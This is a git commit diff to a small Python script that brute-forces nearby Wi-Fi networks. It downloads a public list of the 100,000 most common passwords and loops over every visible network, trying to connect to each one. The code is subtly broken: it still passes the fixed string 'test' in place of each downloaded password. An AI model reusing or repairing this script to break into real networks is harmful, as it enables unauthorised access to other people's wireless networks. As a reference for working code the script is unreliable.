1fecb0ce8995b3807f7c6a0576f97a3d2214fb6b
madeindjs <madeindjs@gmail.com>
2016-07-21 22:34:27 +0200

    loop on passwords

--- __main__.py
+++ __main__.py
@@ -1,29 +1,41 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-
 import sys
+import urllib2
 
 from wifi import Cell, Scheme, exceptions
 
+# need `sudo` to show all networks
 if __name__ == '__main__':
+
+	# download most used passwords on github.com and build a dict
+	url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt"
+	response = urllib2.urlopen( url )
+	txt = response.read()
+	passwords = txt.splitlines()
+
+	print(len(passwords))
+
+	networks = Cell.all('wlan0')
 
 	nb_test = 0
 
-	# need `sudo` to show all networks
-	for cell in Cell.all('wlan0'):
+	for password in passwords:
 
-		try:
-			scheme = Scheme.for_cell('wlan0', 'home', cell, 'test')
-			scheme.activate()
-			print("Connect to {} with `{}` passkey works!!".format(cell, 'test'))
-			sys.exit(0)
-		except exceptions.ConnectionError as e:
-			pass
-		finally:
-			nb_test += 1
+		for cell in networks:
 
-		sys.stdout.write('\rtest n°{}'.format( nb_test ))
-		sys.stdout.flush()
+				try:
+					scheme = Scheme.for_cell('wlan0', 'home', cell, 'test')
+					scheme.activate()
+					print("Connect to {} with `{}` passkey works!!".format(cell, 'test'))
+					sys.exit(0)
+				except exceptions.ConnectionError as e:
+					pass
+				finally:
+					nb_test += 1
+
+				sys.stdout.write('\rtest n°{}'.format( nb_test ))
+				sys.stdout.flush()
 
 	print("you are not lucky :'(")
 		
